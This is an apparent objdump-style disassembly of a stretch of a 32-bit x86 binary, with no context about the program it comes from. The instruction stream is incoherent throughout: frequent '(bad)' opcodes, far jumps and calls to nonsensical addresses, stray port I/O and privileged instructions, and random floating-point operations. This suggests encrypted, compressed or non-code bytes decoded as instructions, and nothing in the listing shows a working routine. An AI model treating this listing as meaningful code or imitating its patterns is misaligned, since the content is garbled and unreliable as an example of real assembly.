  41638d:	mov    ebx,0x40eba6ba
  416392:	mov    DWORD PTR [ecx-0x20f2a3c8],ecx
  416398:	push   ebp
  416399:	daa    
  41639a:	shr    edi,cl
  41639c:	fcmovu st,st(7)
  41639e:	jbe    0x4163a9
  4163a0:	or     bl,BYTE PTR [esi+0xb]
  4163a3:	sub    bl,0x57
  4163a6:	rcr    ebp,cl
  4163a8:	sbb    ebp,DWORD PTR [edi]
  4163aa:	outs   dx,DWORD PTR ds:[esi]
  4163ab:	mov    ebp,DWORD PTR [ebx-0x21]
  4163ae:	sbb    eax,0x88b354a8
  4163b3:	cmp    dl,al
  4163b5:	fdiv   st,st(2)
  4163b7:	push   ds
  4163b8:	and    BYTE PTR [ecx+0x76],0x6b
  4163bc:	or     ebp,DWORD PTR [ebx-0x62]
  4163bf:	adc    BYTE PTR [edx+0x4],ch
  4163c2:	push   0x1c
  4163c4:	in     al,dx
  4163c5:	jmp    0x59fbfd1f
  4163ca:	mov    ah,ch
  4163cc:	sub    ecx,edx
  4163ce:	in     eax,0xa3
  4163d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163d1:	pop    eax
  4163d2:	or     DWORD PTR [esi-0x367987a9],esp
  4163d8:	jmp    0xc526:0x7db5fdda
  4163df:	sbb    al,0x53
  4163e1:	(bad)  
  4163e3:	mov    esp,0xfd264905
  4163e8:	sbb    DWORD PTR [ecx+0x60],esi
  4163eb:	or     al,0x6b
  4163ed:	jbe    0x416403
  4163ef:	mov    ds:0xcb7c04eb,eax
  4163f4:	into   
  4163f5:	shl    ebp,cl
  4163f7:	pop    es
  4163f8:	fidiv  DWORD PTR [edi]
  4163fa:	(bad)
  4163fe:	call   0xebed:0xb144d163
  416405:	dec    edi
  416406:	sbb    eax,0xca30ffa9
  41640b:	test   esi,eax
  41640d:	(bad)  
  41640f:	sub    ecx,DWORD PTR [ebx+0x11]
  416412:	push   esi
  416413:	add    ebp,DWORD PTR [edi-0x77]
  416416:	hlt    
  416417:	push   ecx
  416418:	cwde   
  416419:	scas   al,BYTE PTR es:[edi]
  41641a:	ror    DWORD PTR [esi],cl
  41641c:	das    
  41641d:	pop    ds
  41641e:	add    ebx,DWORD PTR [ebx-0x1]
  416421:	lahf   
  416422:	(bad)  
  416423:	pop    ds
  416424:	cmp    eax,0x133f17df
  416429:	inc    edx
  41642a:	sub    bl,al
  41642c:	mov    esi,0xad7afccf
  416431:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416432:	out    0x7d,eax
  416434:	mov    cl,0x5c
  416436:	or     eax,DWORD PTR [eax-0x21]
  416439:	lock inc ebp
  41643b:	push   eax
  41643c:	retf   0x4cdf
  41643f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416440:	fstp   st(3)
  416442:	scas   al,BYTE PTR es:[edi]
  416443:	daa    
  416444:	frstor [ebx+0x78]
  416447:	fstp   QWORD PTR [esi]
  416449:	fisttp WORD PTR [eax]
  41644b:	ins    DWORD PTR es:[edi],dx
  41644c:	mov    ds:0x3807aa98,al
  416451:	fild   WORD PTR ds:0x44560150
  416457:	popa   
  416458:	or     DWORD PTR [ebp+0x410c4afc],esi
  41645e:	ins    DWORD PTR es:[edi],dx
  41645f:	and    BYTE PTR [esi],bh
  416461:	mov    edi,0xfda9917
  416466:	push   edi
  416467:	mov    bx,WORD PTR [esi]
  41646a:	jmp    0x416467
  41646c:	jmp    0x4164d2
  41646e:	pop    ds
  41646f:	and    eax,0x9bab73dd
  416474:	pop    edi
  416475:	fadd   st(3),st
  416477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416478:	push   0xffffffc7
  41647a:	xor    eax,0x61b53d7
  41647f:	sub    al,0xee
  416481:	outs   dx,DWORD PTR ds:[esi]
  416482:	ret    
  416483:	cmp    ah,BYTE PTR [edx+0x8a2b29f]
  416489:	pop    ebp
  41648a:	jecxz  0x41646b
  41648c:	test   BYTE PTR [edx+0x7d],bl
  41648f:	clc    
  416490:	shl    dh,0x4b
  416493:	inc    ebp
  416494:	pushf  
  416495:	jb     0x416494
  416497:	mov    ds:0x50bf55e3,eax
  41649c:	mov    ecx,0x54c7db65
  4164a1:	int    0x3b
  4164a3:	sub    al,0xa8
  4164a5:	jne    0x4164bd
  4164a7:	jmp    0x68fb7097
  4164ac:	adc    al,0xe9
  4164ae:	or     BYTE PTR [edi+0x2c4c677d],bh
  4164b4:	cs leave 
  4164b6:	xchg   edi,eax
  4164b7:	enter  0xda78,0x22
  4164bb:	shl    dl,1
  4164bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164be:	inc    ecx
  4164bf:	add    bl,ch
  4164c1:	jae    0x41646c
  4164c3:	xchg   edi,eax
  4164c4:	dec    di
  4164c6:	gs test eax,0x947503e2
  4164cc:	fcom   DWORD PTR [bx+di+0x21]
  4164d0:	xchg   esp,eax
  4164d1:	mov    ah,0x7c
  4164d3:	pushf  
  4164d4:	push   ebp
  4164d5:	lock jecxz 0x416458
  4164d8:	out    0x9,al
  4164da:	popf   
  4164db:	pop    ecx
  4164dc:	sbb    eax,0x4852802e
  4164e1:	jle    0x41654d
  4164e3:	test   BYTE PTR [edi],0x29
  4164e6:	adc    eax,ecx
  4164e8:	and    eax,eax
  4164ea:	adc    al,0xeb
  4164ec:	inc    ecx
  4164ed:	mov    eax,DWORD PTR [ebp-0x26e7cfb]
  4164f3:	sbb    cl,BYTE PTR [edx]
  4164f5:	pop    edx
  4164f6:	test   ax,0xd0a2
  4164fa:	ror    al,0xfa
  4164fd:	dec    edi
  4164fe:	popf   
  4164ff:	stos   DWORD PTR es:[edi],eax
  416500:	xchg   edi,eax
  416501:	sub    DWORD PTR [ebp*2+0x49eb5fe2],eax
  416508:	jb     0x416556
  41650a:	dec    esp
  41650b:	add    BYTE PTR [edi+ebx*1-0x2069b3ac],bl
  416512:	lock mov edx,0x7dfb8fae
  416518:	data16 sbb bl,bl
  41651b:	stc    
  41651c:	lahf   
  41651d:	cmp    al,0xfd
  41651f:	adc    BYTE PTR [edx+edx*4-0x207e2cf3],ch
  416526:	cmp    al,0x38
  416528:	mov    ch,0x17
  41652a:	(bad)  
  41652b:	aaa    
  41652c:	in     al,dx
  41652d:	xchg   esp,eax
  41652e:	cld    
  41652f:	xchg   di,ax
  416531:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416532:	mov    eax,0xc10be898
  416537:	mov    al,ds:0xc1a2dfd3
  41653c:	xchg   ebx,eax
  41653d:	outs   dx,BYTE PTR ds:[esi]
  41653e:	rol    BYTE PTR [ebp-0x3d],cl
  416541:	icebp  
  416542:	push   DWORD PTR [esi-0x29]
  416545:	scas   eax,DWORD PTR es:[edi]
  416546:	(bad)  
  416547:	leave  
  416548:	fnstcw WORD PTR [edi-0x7c]
  41654b:	(bad)  
  41654c:	pandn  mm0,QWORD PTR [edi]
  41654f:	cmp    edx,DWORD PTR [ecx+0x0]
  416552:	neg    BYTE PTR [edi-0x5c029607]
  416558:	not    BYTE PTR [ebp*8-0x48f183b0]
  41655f:	leave  
  416560:	mov    ebp,0x2399a066
  416565:	loope  0x41656f
  416567:	clc    
  416568:	cmp    al,0xd7
  41656a:	cld    
  41656b:	dec    ebp
  41656c:	jmp    0x5d702893
  416571:	push   cs
  416572:	dec    ebp
  416573:	enter  0x547d,0x8e
  416577:	and    BYTE PTR ss:[esi-0x1a193693],dh
  41657e:	push   ebp
  41657f:	dec    edx
  416580:	jnp    0x416546
  416582:	dec    esp
  416583:	dec    esp
  416584:	test   BYTE PTR [esi-0x63],cl
  416587:	enter  0x62fd,0x4c
  41658b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41658c:	in     al,0xd3
  41658e:	dec    ecx
  41658f:	add    ebx,DWORD PTR [ebx+0x5c3bfcad]
  416595:	lock mov dh,0xfe
  416598:	je     0x41651b
  41659a:	je     0x416564
  41659c:	pop    ebx
  41659d:	cs call 0xdb8f05c3
  4165a3:	cwde   
  4165a4:	mov    ds:0x3086fcdc,eax
  4165a9:	mov    dh,0xee
  4165ab:	nop
  4165ac:	xlat   BYTE PTR ds:[ebx]
  4165ad:	jmp    0xc3803533
  4165b2:	ror    BYTE PTR [eax+0xfb0ba2b],1
  4165b8:	aad    0x91
  4165ba:	std    
  4165bb:	jmp    0x33c50a4b
  4165c0:	arpl   WORD PTR [esi-0x60],di
  4165c3:	enter  0xa745,0x94
  4165c7:	inc    edx
  4165c8:	ficomp WORD PTR [ebp-0x46f829d8]
  4165ce:	cld    
  4165cf:	shr    DWORD PTR [ebx-0xead4857],0xb5
  4165d6:	mov    esi,0xa26ca8c8
  4165db:	dec    eax
  4165dc:	retf   
  4165dd:	cmp    DWORD PTR [ecx+edi*2-0x15],edi
  4165e1:	jg     0x41663d
  4165e3:	fidiv  WORD PTR [ebp-0x17]
  4165e6:	fbstp  TBYTE PTR [eax]
  4165e8:	fcmovu st,st(6)
  4165ea:	mov    eax,0x75559489
  4165ef:	repz jbe 0x416641
  4165f2:	add    al,0xa2
  4165f4:	jmp    0x41660a
  4165f6:	xchg   ebx,eax
  4165f7:	or     bh,BYTE PTR [ecx+0x61]
  4165fa:	mov    dl,0x8e
  4165fc:	(bad)  
  4165fe:	loop   0x41659a
  416600:	scas   eax,DWORD PTR es:[edi]
  416601:	cmp    dl,ch
  416603:	push   ecx
  416604:	push   ss
  416605:	jns    0x416604
  416607:	(bad)  
  416608:	and    DWORD PTR [ecx],ebp
  41660a:	pusha  
  41660b:	adc    al,0x24
  41660d:	in     al,dx
  41660e:	or     dl,0x54
  416611:	xchg   esp,eax
  416612:	cmp    DWORD PTR [ecx+0x72],esp
  416615:	out    dx,eax
  416616:	pushf  
  416617:	mov    esi,ebx
  416619:	jne    0x4165bc
  41661b:	inc    edi
  41661c:	jmp    0x4165ce
  41661e:	fdiv   st(2),st
  416620:	mov    ebp,0xa0acd83a
  416625:	fild   WORD PTR [ebx+0xffb768a]
  41662b:	mov    esp,0x38006406
  416630:	add    al,0xf
  416632:	jae    0x416672
  416634:	imul   edx,DWORD PTR [edi],0xe038a933
  41663a:	ret    0xb89
  41663d:	mov    ds:0x4b748b30,eax
  416642:	(bad)  
  416643:	out    dx,al
  416644:	lock xchg BYTE PTR [eax],al
  416647:	fs push ebx
  416649:	lods   eax,DWORD PTR ds:[esi]
  41664a:	xor    dl,BYTE PTR [eax-0x51726fed]
  416650:	test   al,0x2e
  416652:	dec    edx
  416653:	enter  0xe68c,0x71
  416657:	xchg   ecx,eax
  416658:	and    BYTE PTR [ebp+0x39],0xb4
  41665c:	in     eax,0xdd
  41665e:	pop    edx
  41665f:	adc    ch,0xf8
  416662:	add    al,0xc8
  416664:	push   edx
  416665:	mov    BYTE PTR [esi+0x5491afa0],bh
  41666b:	cs jmp 0x75f32df7
  416671:	hlt    
  416672:	dec    esp
  416673:	sub    BYTE PTR [edx],bl
  416675:	cmp    dl,BYTE PTR [eax+ecx*8+0x62d152f5]
  41667c:	ffreep st(6)
  41667e:	fnstcw WORD PTR [eax-0x615b1003]
  416684:	sub    DWORD PTR [ecx],ebp
  416686:	sbb    esp,edi
  416688:	fistp  DWORD PTR [edi]
  41668a:	xchg   esp,eax
  41668b:	fisttp WORD PTR [ebp-0x21]
  41668e:	stos   BYTE PTR es:[edi],al
  41668f:	lods   eax,DWORD PTR ds:[esi]
  416690:	mov    bh,al
  416692:	daa    
  416693:	adc    eax,DWORD PTR [ebp-0x5018dca9]
  416699:	(bad)  
  41669a:	xchg   edx,eax
  41669b:	enter  0x6161,0x34
  41669f:	dec    ebx
  4166a0:	out    0x7a,al
  4166a2:	jae    0x41666c
  4166a4:	fstp   QWORD PTR [edi-0x49]
  4166a7:	repz sub cl,BYTE PTR [ebp+0x4ec4f46]
  4166ae:	xor    eax,0xd24fb511
  4166b3:	aaa    
  4166b4:	daa    
  4166b5:	sbb    eax,0xd201d2dc
  4166ba:	jmpw   0x2529
  4166be:	jne    0x4166ef
  4166c0:	arpl   WORD PTR [ebp+ecx*4-0x2cfea90],ax
  4166c7:	retf   
  4166c8:	sahf   
  4166c9:	sbb    ah,BYTE PTR [esi-0x1]
  4166cc:	dec    ebp
  4166cd:	int    0x26
  4166cf:	lahf   
  4166d0:	mov    ds:0x79b19ddf,al
  4166d5:	cmp    dl,ah
  4166d7:	outs   dx,BYTE PTR ds:[esi]
  4166d8:	pop    es
  4166d9:	fucom  st(6)
  4166db:	mov    dh,dh
  4166dd:	pop    edi
  4166de:	xchg   edi,eax
  4166df:	mov    esp,0x45137f05
  4166e4:	repz fild WORD PTR [ebx+0x64f56525]
  4166eb:	lods   al,BYTE PTR ds:[esi]
  4166ec:	cmp    al,0x37
  4166ee:	add    BYTE PTR [ecx+0x14],al
  4166f1:	and    DWORD PTR [edi-0x6c],edi
  4166f4:	fs es adc al,0xbe
  4166f8:	popf   
  4166f9:	jg     0x4166e3
  4166fb:	mov    edx,gs
  4166fd:	les    eax,FWORD PTR [esi+0x53]
  416700:	(bad)  
  416701:	aad    0x9
  416703:	jo     0x416740
  416705:	cmp    eax,0x9867c827
  41670a:	push   ss
  41670b:	nop    ecx
  41670e:	inc    eax
  41670f:	or     al,0xeb
  416711:	cmp    cl,BYTE PTR [ebx+0x7]
  416714:	inc    eax
  416715:	mov    eax,ds:0xdfe26e45
  41671a:	push   0x1e
  41671c:	(bad)  
  41671d:	aad    0x30
  41671f:	leave  
  416720:	call   0xfd20:0x17bc0a9e
  416727:	sbb    al,0x33
  416729:	test   DWORD PTR [ebp+eax*2+0x4f],0x480009f9
  416731:	fistp  WORD PTR [ecx]
  416733:	sub    eax,0x24754d63
  416738:	jmp    0x41678e
  41673a:	aas    
  41673b:	jb     0x416745
  41673d:	sub    ah,BYTE PTR [ebx-0x2e209efb]
  416743:	iret   
  416744:	imul   edi,ecx,0xffffff81
  416747:	sub    eax,0x7bf64320
  41674c:	push   cs
  41674d:	inc    esp
  41674e:	push   ss
  41674f:	dec    eax
  416750:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416751:	enter  0x7ab9,0x9a
  416755:	add    eax,0x13eaeb76
  41675a:	jmp    0x5212:0x5cb798c2
  416761:	jp     0x416760
  416763:	ins    DWORD PTR es:[edi],dx
  416764:	stos   BYTE PTR es:[edi],al
  416765:	stc    
  416766:	and    BYTE PTR [esp],al
  416769:	idiv   eax
  41676b:	(bad)  
  41676c:	lods   eax,DWORD PTR ds:[esi]
  41676d:	mov    ecx,0x8b56a505
  416772:	mov    edx,0xffe1eb9b
  416777:	test   eax,0xcedd95a4
  41677c:	cmp    edi,ebx
  41677e:	leave  
  41677f:	(bad)  
  416781:	iret   
  416782:	mov    bh,0x26
  416784:	and    BYTE PTR [ebx-0x3],cl
  416787:	loopne 0x416727
  416789:	popf   
  41678a:	mov    bl,0x6
  41678c:	jmp    0x3d7f:0x21c88692
  416793:	dec    edi
  416794:	mov    ds:0xf3d7746,al
  416799:	xchg   ebp,eax
  41679a:	std    
  41679b:	pop    ds
  41679c:	sti    
  41679d:	push   ss
  41679e:	inc    eax
  41679f:	xor    BYTE PTR [edi+0x5838a8ac],dl
  4167a5:	les    eax,FWORD PTR [esi+eiz*1-0x36]
  4167a9:	or     cl,BYTE PTR [ecx]
  4167ab:	xor    ebx,ebp
  4167ad:	sar    BYTE PTR [edi+0x1516f39f],1
  4167b3:	add    DWORD PTR [ecx+0x56a1fd2a],esp
  4167b9:	pop    esp
  4167ba:	pop    ebp
  4167bb:	push   ecx
  4167bc:	cmp    DWORD PTR [edx+ecx*2],esp
  4167bf:	mov    edi,0x87c3c377
  4167c4:	sub    dl,BYTE PTR [edx+0xe2d18cc]
  4167ca:	scas   eax,DWORD PTR es:[edi]
  4167cb:	xchg   edx,eax
  4167cc:	loope  0x41677b
  4167ce:	jb     0x416818
  4167d0:	mov    ds:0x356195c2,eax
  4167d5:	scas   eax,DWORD PTR es:[edi]
  4167d6:	mov    dh,0xc8
  4167d8:	inc    edi
  4167d9:	xchg   ebx,eax
  4167da:	clc    
  4167db:	adc    dl,cl
  4167dd:	sub    BYTE PTR [esi],0x9
  4167e0:	(bad)  
  4167e1:	cmp    dh,BYTE PTR [esi]
  4167e3:	add    ebp,DWORD PTR [ebx-0x483c9bd3]
  4167e9:	mov    edx,0x2532dce6
  4167ee:	inc    ecx
  4167ef:	adc    al,0xe6
  4167f1:	cmp    BYTE PTR [edi],bl
  4167f3:	cmc    
  4167f4:	cli    
  4167f5:	out    dx,eax
  4167f6:	jb     0x4167c8
  4167f8:	shl    BYTE PTR [ecx],1
  4167fa:	std    
  4167fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167fc:	mov    ch,0xcf
  4167fe:	inc    ebp
  4167ff:	fucom  st(6)
  416801:	and    eax,0x8024028
  416806:	mov    WORD PTR [esi+0x6b],?
  416809:	push   ds
  41680a:	add    ebp,DWORD PTR [esp+esi*1-0x221f118a]
  416811:	mov    dh,0x1d
  416813:	enter  0x52af,0xf5
  416817:	ret    
  416818:	fisubr WORD PTR [ecx-0xeb7375c]
  41681e:	xor    al,0xd
  416820:	pushf  
  416821:	pusha  
  416822:	jecxz  0x4167f2
  416824:	jmp    0x92ad:0xd774e5cc
  41682b:	pop    eax
  41682c:	sahf   
  41682d:	mov    edx,0xa476c884
  416832:	dec    edx
  416833:	jge    0x416861
  416835:	push   eax
  416836:	pushf  
  416837:	ss pop ss
  416839:	mov    edi,0x5f1d06e0
  41683e:	jge    0x4167da
  416840:	or     eax,0x57df863a
  416845:	or     DWORD PTR [ecx+0x2e2f6c89],edx
  41684b:	pop    ebp
  41684c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41684d:	jnp    0x41686a
  41684f:	add    BYTE PTR [edi],bl
  416851:	or     eax,0xde0c5304
  416856:	aas    
  416857:	pop    eax
  416858:	enter  0x93fb,0x70
  41685c:	mov    ebp,0x4ac86ea5
  416861:	inc    esi
  416862:	and    BYTE PTR [ebp+0x41],0x94
  416866:	or     esp,0x1b
  416869:	cmp    esi,ebx
  41686b:	mov    ah,0xd3
  41686d:	mov    BYTE PTR [edi-0x69966618],dh
  416873:	jp     0x41685e
  416875:	fistp  QWORD PTR [ebx+0x55ff4d49]
  41687b:	jbe    0x41684c
  41687d:	call   0x2791284
  416882:	cmp    eax,0x27459909
  416887:	push   ss
  416888:	jp     0x416869
  41688a:	ja     0x416909
  41688c:	call   DWORD PTR [edi-0x65]
  41688f:	mov    ch,0x9c
  416891:	pop    edi
  416892:	std    
  416893:	imul   BYTE PTR [eax+edx*2-0x5e]
  416897:	pop    esi
  416898:	aas    
  416899:	push   edx
  41689a:	loope  0x416866
  41689c:	mov    dl,0x3a
  41689e:	inc    edx
  41689f:	add    eax,0xf8a4b26f
  4168a4:	repnz nop
  4168a6:	std    
  4168a7:	jb     0x41689d
  4168a9:	sub    al,0xf
  4168ab:	inc    edi
  4168ac:	xor    esi,edi
  4168ae:	daa    
  4168af:	enter  0x5944,0x79
  4168b3:	sub    DWORD PTR [eax-0x1447094d],ecx
  4168b9:	test   BYTE PTR [ebx+0x5d88b18b],0x80
  4168c0:	or     eax,0x3abf8df
  4168c5:	sahf   
  4168c6:	pop    DWORD PTR [esi]
  4168c8:	inc    eax
  4168c9:	and    eax,0x159b74fd
  4168ce:	lods   al,BYTE PTR ds:[esi]
  4168cf:	inc    edx
  4168d0:	pop    esi
  4168d1:	ins    DWORD PTR es:[edi],dx
  4168d2:	jmp    0x596:0x464404c7
  4168d9:	fnstenv [edi*8+0x3dd3c7c7]
  4168e0:	jmp    0x4168c5
  4168e2:	daa    
  4168e3:	jg     0x4168ee
  4168e5:	loope  0x4168ce
  4168e7:	loope  0x4168f1
  4168e9:	cmc    
  4168ea:	(bad)  
  4168eb:	cmp    edx,DWORD PTR [ebx+0x2c]
  4168ee:	bound  ebx,QWORD PTR [ebx+eiz*2]
  4168f1:	xor    dl,BYTE PTR [ecx-0x9]
  4168f4:	mov    ds:0xefa1fe2a,eax
  4168f9:	mov    ds:0x7354be10,eax
  4168fe:	int    0x79
  416900:	imul   ebx,edi,0x6c
  416903:	or     ch,BYTE PTR [edi-0xd97fb89]
  416909:	jno    0x41693b
  41690b:	xchg   esi,eax
  41690c:	jmp    0x416938
  41690e:	(bad)
  416911:	neg    DWORD PTR [esi-0x2f0f4653]
  416917:	sub    edx,DWORD PTR [edi+ebx*8]
  41691a:	xor    bh,ah
  41691c:	aaa    
  41691d:	mov    BYTE PTR [edx],bl
  41691f:	(bad)  
  416920:	in     eax,dx
  416921:	lahf   
  416922:	fimul  DWORD PTR [edi+0x30cedfec]
  416928:	daa    
  416929:	push   ss
  41692a:	in     al,0xc7
  41692c:	dec    esi
  41692d:	add    al,0x94
  41692f:	push   ss
  416930:	mov    ebp,0xeb452218
  416935:	dec    esi
  416936:	(bad)  
  416937:	loopne 0x4169a8
  416939:	test   DWORD PTR es:[esi+0x557adf09],0x3c1ffbc1
  416944:	pop    ebp
  416945:	add    ch,bh
  416947:	pop    edx
  416948:	push   es
  416949:	lods   eax,DWORD PTR ds:[esi]
  41694a:	xchg   edi,eax
  41694b:	xchg   esp,eax
  41694c:	jl     0x41699d
  41694e:	mov    dh,0x80
  416950:	cmp    al,0x87
  416952:	std    
  416953:	or     eax,0xfddcde8d
  416958:	loopne 0x4169cb
  41695a:	call   0xc79e3a36
  41695f:	sbb    dh,BYTE PTR [eax-0x73]
  416962:	int    0x0
  416964:	dec    ebp
  416965:	adc    esi,DWORD PTR [eax+ecx*8+0x16]
  416969:	xor    bl,cl
  41696b:	pop    esp
  41696c:	mov    bh,0xc6
  41696e:	pop    ss
  41696f:	out    0xeb,eax
  416971:	daa    
  416972:	or     edx,DWORD PTR [ebx+0x6e8a541e]
  416978:	and    eax,0xa9ea1eed
  41697d:	fistp  QWORD PTR [esi-0xfb3bbf4]
  416983:	jne    0x4169dd
  416985:	daa    
  416986:	mov    al,ds:0xb5ca8ec8
  41698b:	xchg   esi,eax
  41698c:	xchg   DWORD PTR [ebp-0x3b],ebx
  41698f:	in     al,0xe9
  416991:	inc    ebx
  416992:	ja     0x4169fe
  416994:	xchg   ecx,eax
  416995:	rol    BYTE PTR [ebx-0x7e22cdb8],1
  41699b:	or     al,0xb5
  41699d:	jg     0x416a09
  41699f:	lock fsubp st(1),st
  4169a2:	xor    DWORD PTR [ebx+0x28],esi
  4169a5:	lahf   
  4169a6:	mov    eax,0xd017e03a
  4169ab:	add    ebp,ebx
  4169ad:	or     DWORD PTR [ebx+0x1f],ecx
  4169b0:	cdq    
  4169b1:	xchg   esi,eax
  4169b2:	dec    eax
  4169b3:	popf   
  4169b4:	scas   al,BYTE PTR es:[edi]
  4169b5:	loopne 0x416a0a
  4169b7:	mov    eax,0x486cc2c6
  4169bc:	adc    al,BYTE PTR [ebx+0xe]
  4169bf:	sub    ch,bl
  4169c1:	push   ds
  4169c2:	mov    BYTE PTR [esi+0xea48601],dh
  4169c8:	jb     0x4169a7
  4169ca:	xchg   edx,eax
  4169cb:	mov    al,ds:0xc68213a9
  4169d0:	sub    ebp,DWORD PTR [ebp-0x30]
  4169d3:	call   0x6df5e8be
  4169d8:	inc    ecx
  4169d9:	shr    BYTE PTR [ebx+eiz*2],0x18
  4169dd:	pusha  
  4169de:	clc    
  4169df:	(bad)  
  4169e0:	jle    0x41698d
  4169e2:	sub    al,0x1e
  4169e4:	cmp    BYTE PTR [edi+0x22],0x38
  4169e8:	xchg   ecx,eax
  4169e9:	jmp    0x3d4992ea
  4169ee:	gs leave 
  4169f0:	mov    eax,ds:0x3be63f0
  4169f5:	xchg   esi,eax
  4169f6:	imul   ecx,DWORD PTR [eax-0x45],0xffffffb0
  4169fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169fb:	push   ebx
  4169fc:	ins    BYTE PTR es:[edi],dx
  4169fd:	adc    eax,DWORD PTR [ebx]
  4169ff:	jge    0x416a12
  416a01:	and    edi,ebp
  416a03:	aaa    
  416a04:	push   ss
  416a05:	ins    DWORD PTR es:[edi],dx
  416a06:	mov    ch,0xd6
  416a08:	jbe    0x4169e6
  416a0a:	(bad)  
  416a0b:	pop    ebp
  416a0c:	(bad)  
  416a0d:	sbb    edi,DWORD PTR [edx+0x5a335bcc]
  416a13:	mov    ebp,0xfc31c6eb
  416a18:	out    dx,al
  416a19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a1a:	cmp    edx,DWORD PTR [edi+0x1a]
  416a1d:	(bad)  
  416a1f:	addr16 cmp al,0xb9
  416a22:	loopne 0x416a58
  416a24:	stos   DWORD PTR es:[edi],eax
  416a25:	pop    ss
  416a26:	repz mov ?,WORD PTR [edx]
  416a29:	mov    ah,0xed
  416a2b:	(bad)  
  416a2c:	mov    edi,0x87c3d159
  416a31:	(bad)  
  416a32:	into   
  416a33:	mov    DWORD PTR [edx],ecx
  416a35:	mov    bh,BYTE PTR [ebp-0x51]
  416a38:	jmp    0xe3ade255
  416a3d:	mov    ds:0x5cf46206,al
  416a42:	cs sbb al,0x23
  416a45:	test   BYTE PTR ds:0x34477a1b,dh
  416a4b:	adc    ah,BYTE PTR [esi-0x21]
  416a4e:	dec    edi
  416a4f:	(bad)  
  416a50:	mov    esp,0x623d059
  416a55:	aaa    
  416a56:	hlt    
  416a57:	stc    
  416a58:	pop    ss
  416a59:	xchg   esi,eax
  416a5a:	(bad)  
  416a5c:	mov    ds:0x2184e462,al
  416a61:	fistp  WORD PTR [ecx]
  416a63:	retf   0x6d41
  416a66:	mov    ebp,0x3052271f
  416a6b:	sti    
  416a6c:	xchg   esi,eax
  416a6d:	jne    0x416a9d
  416a6f:	vandps xmm1,xmm2,XMMWORD PTR [esp+edi*1-0x512b0f91]
  416a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a79:	fst    DWORD PTR [edi-0x3c]
  416a7c:	cli    
  416a7d:	mov    DWORD PTR [ebp-0x6c3475a4],ebx
  416a83:	push   esi
  416a84:	jmp    0x416a4b
  416a86:	fdiv   QWORD PTR [esi-0x3c]
  416a89:	outs   dx,DWORD PTR ds:[esi]
  416a8a:	dec    BYTE PTR [ecx+0x6050e2d8]
  416a90:	push   0x29
  416a92:	pop    es
  416a93:	leave  
  416a94:	push   edi
  416a95:	or     BYTE PTR [ebx-0x3de09fb3],bl
  416a9b:	test   bl,ch
  416a9d:	test   eax,0xfdec6967
  416aa2:	dec    esi
  416aa3:	scas   eax,DWORD PTR es:[edi]
  416aa4:	pushf  
  416aa5:	fild   QWORD PTR [ebx]
  416aa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416aa8:	fdiv   DWORD PTR [eax-0x6a]
  416aab:	loop   0x416b28
  416aad:	adc    ebp,DWORD PTR [ebx]
  416aaf:	fsubp  st(3),st
  416ab1:	or     eax,0x49826c21
  416ab6:	pop    es
  416ab7:	push   ebp
  416ab8:	cmp    eax,0x6665b60b
  416abd:	pushf  
  416abe:	out    0x21,al
  416ac0:	out    dx,al
  416ac1:	mov    edi,0x2fda9962
  416ac6:	std    
  416ac7:	jmp    0x4cd4:0x3d3a5cc7
  416ace:	sbb    cl,al
  416ad0:	add    al,0x58
  416ad2:	inc    ebx
  416ad3:	xchg   edi,eax
  416ad4:	cmp    ch,BYTE PTR [ecx]
  416ad6:	outs   dx,DWORD PTR ds:[esi]
  416ad7:	dec    ebp
  416ad8:	jmp    FWORD PTR [edi-0x26]
  416adb:	lods   al,BYTE PTR ds:[esi]
  416adc:	jmp    0x416aec
  416ade:	inc    eax
  416adf:	mov    WORD PTR [eax],?
  416ae1:	mov    bh,0xc8
  416ae3:	adc    al,0x36
  416ae5:	fisttp WORD PTR [edx+0x44959da8]
  416aeb:	adc    eax,esp
  416aed:	retf   0xdbfd
  416af0:	dec    edx
  416af1:	xor    edx,eax
  416af3:	les    edi,FWORD PTR [edx+eax*1-0x3f]
  416af7:	dec    ecx
  416af8:	sub    al,0x7
  416afa:	cli    
  416afb:	inc    edx
  416afc:	jp     0x416ac0
  416afe:	scas   al,BYTE PTR es:[edi]
  416aff:	enter  0x2480,0xf8
  416b03:	pop    eax
  416b04:	adc    eax,0xb86efd2c
  416b09:	imul   ecx,esp,0x77c66d0b
  416b0f:	enter  0x7f53,0x6c
  416b13:	mov    bl,0x7
  416b15:	mov    ds:0x39ec9e66,eax
  416b1a:	mov    esi,0x60d738a
  416b1f:	fisub  WORD PTR [esi-0x69a112be]
  416b25:	mov    dl,0x84
  416b27:	leave  
  416b28:	cmc    
  416b29:	jno    0x416b04
  416b2b:	adc    ebx,DWORD PTR [edx-0x64dfab53]
  416b31:	sub    al,0x26
  416b33:	pop    esp
  416b34:	out    dx,al
  416b35:	and    al,BYTE PTR [edi-0x1fbca58e]
  416b3b:	(bad)  
  416b3c:	sub    esp,DWORD PTR [esi-0x215312fc]
  416b42:	arpl   WORD PTR [edx+0x298f98c],cx
  416b48:	test   al,0x1b
  416b4a:	nop
  416b4b:	stc    
  416b4c:	jmp    0x416ae1
  416b4e:	mov    edi,0x367d024b
  416b53:	mov    eax,DWORD PTR [ecx+0x1174d8df]
  416b59:	add    ah,BYTE PTR [esp+esi*4-0x7b]
  416b5d:	pop    esi
  416b5e:	and    al,0x1c
  416b60:	in     al,0x7
  416b62:	jecxz  0x416b32
  416b64:	icebp  
  416b65:	or     eax,0x6eb7bab
  416b6a:	js     0x416b97
  416b6c:	push   edi
  416b6d:	xor    eax,0x6d08c887
  416b72:	loope  0x416b5a
  416b74:	inc    esi
  416b75:	mov    ds:0xcbeb45ce,al
  416b7a:	imul   esi,DWORD PTR [ebp-0x54a87d46],0x8d8fec44
  416b84:	add    ah,al
  416b86:	dec    esp
